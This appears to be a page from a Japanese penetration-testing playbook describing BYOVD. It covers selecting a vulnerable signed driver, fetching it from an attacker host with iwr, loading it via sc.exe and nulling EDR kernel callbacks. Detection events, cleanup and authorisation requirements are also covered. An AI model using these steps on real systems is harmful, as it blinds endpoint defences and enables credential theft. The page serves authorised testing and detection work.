# BYOVD（Bring Your Own Vulnerable Driver）

> **[HIGH IMPACT]** 本攻撃は以下の理由で本番では原則禁止または個別合意必須：
> - [x] 業務停止リスク（カーネル空間での操作はシステムクラッシュ・BSOD の直接原因になりえる。業務停止リスク最高）
> - [ ] 持続化に該当
> - [x] 不可逆な設定変更を含む（Driver Signature Enforcement の無効化、カーネルコールバック削除は再起動しないと戻らない場合がある）
> - [x] SIEM/EDR で確実に検知される（Sysmon Event ID 6 カーネルドライバーロード / Defender for Endpoint「Vulnerable driver load」）
>
> 実施可否は**書面承認必須**。クライアントの変更管理プロセスへの事前登録を強く推奨する。
> **カーネル空間の操作 = 業務停止リスク最高のため、演習環境でのみ自由に実施してよい。**
> 演習環境での扱い：制約なし（HTB / OSCP 等は本セクション全項目をスキップしてよい）

---

## 着火条件

以下のいずれかが成立し、かつ EDR がカーネルレベルで動作しており通常の Potato 系 / AMSI バイパス / EXE 実行がすべてブロックされる場合：

- ターゲットが管理者権限（または SeLoadDriverPrivilege）を持つアカウントのコンテキストで動いている
- EDR ドライバー（CrowdStrike Falcon / SentinelOne Agent 等）が Kernel Callback を登録しており、ユーザー空間からの AMSI バイパス・プロセスインジェクションがことごとく検知・ブロックされる
- Driver Signature Enforcement（DSE）が有効（Windows 10/11 の通常環境では常に有効）だが、既知の脆弱なドライバーを経由すると DSE を回避できる

**攻撃者の思考トレース：** カーネルレベルの EDR は、ユーザー空間の操作（IATフック・メモリパッチ等）を防ぐために Kernel Callback（PsSetCreateProcessNotifyRoutine / ObRegisterCallbacks 等）でプロセス生成・スレッド注入を監視する。BYOVD はこの監視をカーネル内から解除することで、EDR の目を無効化する。脆弱なドライバーを正規の署名付きドライバーとしてロードし、その脆弱性を突いてカーネルに任意コードを実行させるのが原理。

---

## 環境前提

- **実行環境**: ターゲット（Windows シェル内）。管理者権限または `SeLoadDriverPrivilege` が必要
- **必要なツール**:
  - `sc.exe`（Windows 標準搭載）でドライバーをサービスとして登録・起動
  - 脆弱なドライバー `.sys` ファイル（別途転送要 / LOLDrivers.io から特定）
  - `OSR Driver Loader`（テスト目的の別途インストール要、本番では sc.exe を優先）
- **オフライン代替**: ドライバーファイルは事前に USB 等で搬入。LOLDrivers.io は事前にオフラインで参照して候補を決めておく
- **DSE の状態確認**: 通常環境では Driver Signature Enforcement が有効。脆弱ドライバーは「正規署名付き」なので DSE をバイパスせずにロードできる点が BYOVD の核心

---

## 観点・着眼点

### 先に確認すること

| 確認項目 | コマンド / 方法 | 判断 |
|---------|--------------|------|
| 管理者権限の有無 | `whoami /groups \| findstr "S-1-5-32-544"` | Administrators グループに入っていれば OK |
| SeLoadDriverPrivilege | `whoami /priv \| findstr SeLoad` | Enabled であれば直接使える |
| Secure Boot の状態 | `Confirm-SecureBootUEFI` | True の場合はカーネルドライバー操作がより制限される |
| 現在ロードされているドライバー一覧 | `driverquery /fo csv \| findstr /i "running"` | EDR ドライバー名を確認（crowdstrike / sentinelone / carbon 等） |

**何が出たら次に何をするか：**

| シグナル | 判断 |
|---------|------|
| EDR ドライバーが `Running` の状態で、AMSI パッチ・PS インジェクションが全滅 | BYOVD の着火条件成立。脆弱ドライバーの選定へ進む |
| Secure Boot: True かつ Kernel-mode Code Signing 厳格 | 脆弱ドライバー選定を慎重に行う（DSE フル有効で署名なしドライバーは絶対に通らない） |
| 管理者権限なし | `SeLoadDriverPrivilege` もなければ BYOVD は不可。UAC バイパスや SeImpersonate 昇格を先に行う |

---

## 手順

### Step 1: 脆弱なドライバーの選定

**LOLDrivers.io** および **Microsoft の Vulnerable Driver Blocklist** を参照して、対象 OS バージョンで悪用可能な既知の脆弱ドライバーを選定する。

**主要参照先：**

- **LOLDrivers.io**（`https://www.loldrivers.io/`）: 悪用可能なドライバーのデータベース。CVE・悪用タイプ・OS バージョン対応・ハッシュ値で検索できる
- **Microsoft Vulnerable Driver Blocklist**（`https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-driver-block-rules`）: Microsoft が発行するブロックリスト。ブロックリストに載っているドライバーは Defender for Endpoint が自動ブロックする

**選定基準（何を見るか）：**

| 確認項目 | 内容 |
|---------|------|
| `CVE` / 脆弱性タイプ | `IOCTL` 経由の任意カーネルメモリ読み書き（`arbitrary read/write`）が最も汎用的 |
| OS バージョン対応 | ターゲット OS のビルド番号と一致しているか |
| ブロックリスト掲載 | Microsoft Blocklist に載っていない（Defender がブロックしない）か |
| ファイルハッシュ | LOLDrivers.io に掲載されているハッシュ値と転送前に照合する |

**よく悪用される代表的な脆弱ドライバーカテゴリ（LOLDrivers.io で確認）：**

- 過去に広く使われた AV / ゲームアンチチート系ドライバー（RTCore64.sys / DBUtil_2_3.sys 等）
- ハードウェアベンダー製ドライバー（各種ディスク・BIOS アクセス系）
- ※ 実際のファイル名・ハッシュ値は LOLDrivers.io で最新を確認すること（情報が古くなりやすい）

---

### Step 2: ドライバーのロード（sc.exe 使用）

**事前準備（必須）：** ドライバー `.sys` ファイルをターゲットに転送しておく（HTTP サーバー経由または evil-winrm upload）。

```powershell
# [Target] ドライバーをターゲットに転送（HTTP サーバーから）
iwr "http://[ATTACKER_IP]:8888/[DRIVER_NAME].sys" -OutFile "C:\Windows\Temp\[DRIVER_NAME].sys"
```

```cmd
:: [Target] sc.exe でドライバーをカーネルサービスとして登録
sc.exe create [SVC_NAME] type= kernel start= demand binPath= "C:\Windows\Temp\[DRIVER_NAME].sys"

:: [Target] ドライバーを起動
sc.exe start [SVC_NAME]
:: "service started successfully" または "already running" が出ればロード成功
```

**出力の読み方：**

```
[SC] CreateService SUCCESS              → 登録成功
[SC] StartService SUCCESS               → カーネルにロード成功（カーネルモードで動作中）
ERROR 1275: ... driver could not be loaded  → ブロック（Blocklist / セキュアブート / DSE）
```

---

### Step 3: 脆弱性を利用したカーネル操作

> **具体的なエクスプロイトコードはドライバーごとに異なる。** 以下は代表的な操作タイプを示す。実装は LOLDrivers.io のリンク先 PoC / GitHub を参照すること。

**操作タイプ別の典型的な目的：**

| 操作タイプ | 目的 | 典型的な効果 |
|-----------|------|-----------|
| 任意カーネルメモリ書き込み | EDR の Kernel Callback ポインタを NULL に書き換える | EDR がプロセス生成を検知できなくなる（無効化） |
| 任意カーネルメモリ読み取り | EDR ドライバーのメモリからシークレット・設定を抽出 | 検知ルール構造の把握 |
| カーネル空間でのコード実行 | SYSTEM 権限でカーネルモードコードを走らせる | 任意の権限昇格・プロセス隠蔽 |

**EDR の Kernel Callback 削除（概念）：**

1. `PsSetCreateProcessNotifyRoutine` / `ObRegisterCallbacks` で EDR が登録したコールバック配列のアドレスをカーネルメモリから読み取る
2. 脆弱ドライバーの任意書き込み IOCTL を使って、コールバックポインタを NULL に書き換える
3. 以降はプロセス生成・オブジェクトアクセスが EDR に通知されなくなる

> **原理の詳細** → `../../06_Concepts/Windows_Standalone_vs_AD.md` （Kernel Callback の仕組みは現時点未記載。必要に応じて `06_Concepts/` に追加する）

---

### Step 4: 目的達成後のドライバーアンロード（原状回復）

```cmd
:: [Target] ドライバーを停止・削除
sc.exe stop [SVC_NAME]
sc.exe delete [SVC_NAME]

:: [Target] ドライバーファイルを削除
del C:\Windows\Temp\[DRIVER_NAME].sys
```

**原状回復チェックリスト：**

- ✅ `sc.exe stop / delete` でサービスを削除
- ✅ `.sys` ファイルをターゲットから削除
- ✅ `driverquery` で `[SVC_NAME]` が一覧から消えたことを確認
- ✅ 再起動不要かどうかを確認（一部ドライバーはアンロード後も kernel list に残る）
- ✅ カーネルコールバックを NULL に書き換えた場合は**再起動が必須**（コールバック配列は再起動時に EDR が再登録する）

---

## 刺さらなかったとき

| 現象 | 原因 | 代替 |
|------|------|------|
| `sc.exe start` で ERROR 1275 | Microsoft Vulnerable Driver Blocklist に掲載されているドライバー | LOLDrivers.io で別のドライバーを選定する |
| ドライバーはロードできたが IOCTL が失敗 | OS バージョン / カーネルオフセットの不一致 | PoC を別バージョン対応のものに切り替える |
| Secure Boot + HVCI（Hypervisor-Protected Code Integrity）が有効 | カーネルモードコードは MS の署名が必要。BYOVD 系ドライバーでは通らない場合がある | HVCI の状態を確認し、代替手法（ユーザー空間攻撃）を検討する |
| EDR がドライバーロード自体を即ブロック | EDR の ELAM（Early Launch Antimalware）が Blocklist をリアルタイムチェック | ブロックリスト未掲載の脆弱ドライバーを選定する |

---

## 検知観点

| 検知ポイント | シグネチャ / Event |
|------------|-----------------|
| **Sysmon Event ID 6（Driver Loaded）** | ドライバーの `SignerName` や `Hashes` でブロックリスト照合が可能。`Signed: false` の場合は即アラート対象 |
| **Sysmon Event ID 13（RegistryEvent）** | `sc.exe create` がドライバーのレジストリキー（`HKLM\SYSTEM\CurrentControlSet\Services\[SVC_NAME]`）を作成する際に記録 |
| **Event ID 7045（New Service Installed）** | `sc.exe create` 時に記録される。サービス種別が `kernel` のものは特に注目される |
| **Defender for Endpoint「Vulnerable driver load」** | Microsoft Blocklist に載っているドライバーは即ブロック＋アラート |
| **CrowdStrike「Potential BYOVD Activity」** | 既知の脆弱ドライバーロードパターンを検知。SentinelOne も同様のシグネチャを持つ |
| **Driver Signature Enforcement 無効化** | `bcdedit /set testsigning on` 等の操作は Event ID 4657（レジストリ変更）で記録。これは BYOVD とは別の手法だが同様の目的で検知対象 |

---

## 本番での前提

- **事前合意の要否**: ★★★（書面承認必須）。カーネル空間での操作はシステムクラッシュ（BSOD）の直接原因となりえる。業務停止リスクが全攻撃手法中で最高クラス。変更管理プロセスへの事前登録・保守窓口の確保を必須とする
- **想定されるSIEM/EDR検知**:
  - Sysmon Event ID 6（Driver Loaded）: ドライバーロード全件が記録される
  - Event ID 7045（New Service Installed）: `sc.exe create` が記録される
  - Defender for Endpoint「Vulnerable driver load」: Microsoft Blocklist 掲載ドライバーは自動ブロック
  - CrowdStrike / SentinelOne の「Potential BYOVD Activity」アラート
- **業務影響リスク**: **最高**。Kernel Callback の書き換え失敗・ドライバーの不具合によりカーネルパニック（BSOD / システム停止）が発生するリスクがある。ミッションクリティカルなシステムへの実施は原則禁止
- **原状回復必須項目**:
  - ✅ `sc.exe stop / delete` でドライバーサービスを削除
  - ✅ ターゲットから `.sys` ファイルを削除
  - ✅ Kernel Callback を書き換えた場合は再起動を実施（元の状態への復元）
  - ✅ `driverquery` で削除されたことを確認してから報告
- **取得情報の取扱**: カーネル操作でアクセスしたメモリ内容（認証情報等）は暗号化保管・案件終了時破棄
- **演習環境での扱い**: 制約なし（HTB / OSCP 等は本セクション全項目をスキップしてよい）

---

## 関連技術

- 前：EDR がユーザー空間の AMSI バイパス・Potato 系をブロックし、代替手段が必要 → `./Enumeration_Checklist.md`（AMSI バイパスセクション）
- 前：SeLoadDriverPrivilege の確認 → `./Enumeration_Checklist.md`（Step 1: `whoami /all`）
- 前：UAC 昇格で管理者権限を取得 → `./Enumeration_Checklist.md`（Step 1.3: UAC バイパス）
- 後：カーネルコールバック削除後に EDR が無効化されたら通常の LSASS ダンプ等を実行 → `./Privilege_Tokens.md`（SeDebug セクション）
- 後：取得した NTLM ハッシュで Pass-The-Hash → `./Credential_Dumping.md`
